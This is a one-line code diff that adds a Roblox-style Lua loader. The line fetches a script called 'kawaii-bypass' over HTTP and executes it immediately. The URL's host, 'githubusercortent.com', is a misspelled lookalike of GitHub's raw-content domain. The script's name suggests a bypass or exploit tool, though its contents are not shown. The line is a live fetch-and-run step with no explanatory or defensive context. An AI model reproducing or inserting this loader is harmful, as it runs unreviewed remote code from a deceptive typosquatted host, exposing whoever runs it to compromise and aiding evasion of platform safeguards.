@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass",true))()
